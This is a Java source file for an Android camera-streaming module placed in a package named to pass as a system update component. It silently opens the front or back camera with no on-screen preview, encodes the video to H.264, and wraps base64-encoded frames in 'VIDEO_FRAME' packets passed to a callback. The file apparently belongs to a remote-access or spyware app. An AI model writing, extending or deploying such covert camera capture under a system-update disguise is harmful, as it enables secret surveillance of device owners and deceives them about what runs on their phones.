package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;

public class VideoModule {
    private static final String TAG = "VideoModule";
    private Context context;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFrontCamera = false;
    
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    
    // MediaCodec for H.264 encoding
    private MediaCodec mediaCodec;
    private Surface encoderSurface;
    private MediaCodec.BufferInfo bufferInfo;
    
    private AtomicBoolean isStreaming = new AtomicBoolean(false);
    private AtomicBoolean isProcessing = new AtomicBoolean(false);
    private int frameCount = 0;
    private long startTime = 0;
    private VideoCallback currentCallback;
    
    // Thread for processing encoded frames
    private HandlerThread processingThread;
    private Handler processingHandler;
    
    public interface VideoCallback {
        void onVideoFrame(String base64Frame);
        void onStreamStarted();
        void onStreamStopped();
        void onError(String error);
    }
    
    public VideoModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.bufferInfo = new MediaCodec.BufferInfo();
    }
    
    public void startStreaming(final VideoCallback callback, boolean useFrontCamera) {
        Log.d(TAG, "startStreaming() called");
        
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        if (isStreaming.getAndSet(true)) {
            callback.onError("ERROR: Already streaming");
            return;
        }
        
        this.currentCallback = callback;
        isFrontCamera = useFrontCamera;
        
        // Select camera
        try {
            selectCamera(useFrontCamera);
            if (cameraId == null) {
                callback.onError("ERROR: No camera available");
                isStreaming.set(false);
                return;
            }
        } catch (Exception e) {
            callback.onError("ERROR: " + e.getMessage());
            isStreaming.set(false);
            return;
        }
        
        // Start camera thread
        cameraThread = new HandlerThread("VideoStreamingThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        // Start processing thread
        processingThread = new HandlerThread("VideoProcessingThread");
        processingThread.start();
        processingHandler = new Handler(processingThread.getLooper());
        
        cameraHandler.post(() -> {
            try {
                // Initialize MediaCodec for H.264 encoding
                boolean initSuccess = initMediaCodec();
                if (!initSuccess) {
                    callback.onError("ERROR: Failed to initialize MediaCodec");
                    isStreaming.set(false);
                    return;
                }
                
                // Set up camera with encoder surface
                boolean setupSuccess = setupCameraWithEncoder();
                if (!setupSuccess) {
                    callback.onError("ERROR: Failed to setup camera");
                    isStreaming.set(false);
                    return;
                }
                
                startTime = System.currentTimeMillis();
                
                // Start processing frames
                startFrameProcessing();
                
                callback.onStreamStarted();
                
            } catch (Exception e) {
                Log.e(TAG, "Error starting stream", e);
                callback.onError("ERROR: " + e.getMessage());
                isStreaming.set(false);
            }
        });
    }
    
    private boolean initMediaCodec() {
        try {
            // Configure MediaCodec for H.264 encoding
            MediaFormat format = MediaFormat.createVideoFormat(
                MediaFormat.MIMETYPE_VIDEO_AVC, 640, 480);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, 500000); // 500 kbps
            format.setInteger(MediaFormat.KEY_FRAME_RATE, 15);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2); // Keyframe every 2 seconds
            
            mediaCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            if (mediaCodec == null) {
                Log.e(TAG, "Failed to create MediaCodec");
                return false;
            }
            
            mediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoderSurface = mediaCodec.createInputSurface();
            if (encoderSurface == null) {
                Log.e(TAG, "Failed to create encoder surface");
                return false;
            }
            
            mediaCodec.start();
            Log.d(TAG, "MediaCodec initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing MediaCodec", e);
            return false;
        }
    }
    
    private boolean setupCameraWithEncoder() {
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = characteristics.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            
            if (map == null) {
                Log.e(TAG, "StreamConfigurationMap is null");
                return false;
            }
            
            // Choose a good size for streaming (640x480 works well)
            Size[] sizes = map.getOutputSizes(Surface.class);
            if (sizes == null || sizes.length == 0) {
                Log.e(TAG, "No output sizes available");
                return false;
            }
            
            Size selectedSize = null;
            for (Size size : sizes) {
                if (size.getWidth() == 640 && size.getHeight() == 480) {
                    selectedSize = size;
                    break;
                }
            }
            if (selectedSize == null && sizes.length > 0) {
                selectedSize = sizes[0]; // Fallback to first available
            }
            
            Log.d(TAG, "Using size: " + selectedSize.getWidth() + "x" + selectedSize.getHeight());
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@androidx.annotation.NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    
                    try {
                        // Create capture request for preview
                        final CaptureRequest.Builder builder = camera.createCaptureRequest(
                            CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(encoderSurface);
                        
                        camera.createCaptureSession(
                            Arrays.asList(encoderSurface),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(
                                        @androidx.annotation.NonNull CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        session.setRepeatingRequest(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(
                                                        @androidx.annotation.NonNull CameraCaptureSession session,
                                                        @androidx.annotation.NonNull CaptureRequest request,
                                                        @androidx.annotation.NonNull TotalCaptureResult result) {
                                                    frameCount++;
                                                }
                                            }, cameraHandler);
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error setting repeating request", e);
                                        if (currentCallback != null) {
                                            currentCallback.onError("ERROR: " + e.getMessage());
                                        }
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(
                                        @androidx.annotation.NonNull CameraCaptureSession session) {
                                    Log.e(TAG, "Camera session configure failed");
                                    if (currentCallback != null) {
                                        currentCallback.onError("ERROR: Session configure failed");
                                    }
                                }
                            }, cameraHandler
                        );
                    } catch (Exception e) {
                        Log.e(TAG, "Error creating capture session", e);
                        if (currentCallback != null) {
                            currentCallback.onError("ERROR: " + e.getMessage());
                        }
                    }
                }
                
                @Override
                public void onDisconnected(@androidx.annotation.NonNull CameraDevice camera) {
                    Log.d(TAG, "Camera disconnected");
                    stopStreaming(null);
                }
                
                @Override
                public void onError(@androidx.annotation.NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    if (currentCallback != null) {
                        currentCallback.onError("ERROR: Camera error " + error);
                    }
                    stopStreaming(null);
                }
            }, cameraHandler);
            
            return true;
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception opening camera", e);
            if (currentCallback != null) {
                currentCallback.onError("ERROR: Camera permission denied");
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error setting up camera", e);
            return false;
        }
    }
    
    private void startFrameProcessing() {
        if (!isStreaming.get() || isProcessing.get()) return;
        
        isProcessing.set(true);
        
        processingHandler.post(() -> {
            while (isStreaming.get()) {
                try {
                    if (mediaCodec == null) {
                        Log.e(TAG, "MediaCodec is null, stopping processing");
                        break;
                    }
                    
                    int outputBufferId = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000);
                    
                    if (outputBufferId >= 0) {
                        ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(outputBufferId);
                        
                        if (outputBuffer != null && bufferInfo.size > 0) {
                            byte[] frameData = new byte[bufferInfo.size];
                            outputBuffer.get(frameData);
                            
                            // Check if this is a keyframe or regular frame
                            boolean isKeyFrame = (bufferInfo.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                            
                            // Send frame data
                            String base64Frame = Base64.encodeToString(frameData, Base64.NO_WRAP);
                            
                            // Format: VIDEO_FRAME|isKeyFrame|timestamp|base64data
                            String framePacket = String.format("VIDEO_FRAME|%d|%d|%s",
                                isKeyFrame ? 1 : 0,
                                System.currentTimeMillis(),
                                base64Frame);
                            
                            if (currentCallback != null) {
                                currentCallback.onVideoFrame(framePacket);
                            }
                        } else {
                            Log.w(TAG, "Output buffer is null or size is 0");
                        }
                        
                        mediaCodec.releaseOutputBuffer(outputBufferId, false);
                    } else if (outputBufferId == MediaCodec.INFO_TRY_AGAIN_LATER) {
                        // No frame available yet, wait a bit
                        try {
                            Thread.sleep(10);
                        } catch (InterruptedException e) {
                            break;
                        }
                    } else if (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                        Log.d(TAG, "Output format changed");
                    }
                } catch (IllegalStateException e) {
                    Log.e(TAG, "Error processing frame", e);
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Unexpected error in frame processing", e);
                    break;
                }
            }
            isProcessing.set(false);
        });
    }
    
    public void stopStreaming(VideoCallback callback) {
        Log.d(TAG, "stopStreaming() called");
        isStreaming.set(false);
        
        // Stop capture session
        if (captureSession != null) {
            try {
                captureSession.stopRepeating();
                captureSession.close();
            } catch (Exception e) {
                Log.e(TAG, "Error closing capture session", e);
            }
            captureSession = null;
        }
        
        // Close camera
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        // Clean up MediaCodec
        if (mediaCodec != null) {
            try {
                mediaCodec.stop();
                mediaCodec.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing MediaCodec", e);
            }
            mediaCodec = null;
        }
        
        // Clean up encoder surface
        if (encoderSurface != null) {
            encoderSurface.release();
            encoderSurface = null;
        }
        
        // Clean up processing thread
        if (processingThread != null) {
            processingThread.quitSafely();
            try {
                processingThread.join(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            processingThread = null;
            processingHandler = null;
        }
        
        // Clean up camera thread
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            cameraThread = null;
            cameraHandler = null;
        }
        
        if (callback != null) {
            callback.onStreamStopped();
        } else if (currentCallback != null) {
            currentCallback.onStreamStopped();
        }
        
        currentCallback = null;
        Log.d(TAG, "Stream stopped, frames sent: " + frameCount);
    }
    
    public void stopStreaming() {
        stopStreaming(null);
    }
    
    public boolean isStreaming() {
        return isStreaming.get();
    }
    
    private void selectCamera(boolean useFront) throws CameraAccessException {
        String[] cameraIds = cameraManager.getCameraIdList();
        if (cameraIds == null || cameraIds.length == 0) {
            Log.e(TAG, "No cameras available");
            return;
        }
        
        for (String id : cameraIds) {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id;
                    Log.d(TAG, "Selected front camera: " + id);
                    return;
                } else if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    Log.d(TAG, "Selected back camera: " + id);
                    return;
                }
            }
        }
        
        // If no matching camera found, use first available
        cameraId = cameraIds[0];
        Log.w(TAG, "No matching camera found, using first available: " + cameraId);
    }
    
    private boolean checkPermission() {
        boolean hasPermission = ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
        
        if (!hasPermission) {
            Log.e(TAG, "Camera permission not granted");
        }
        return hasPermission;
    }
}
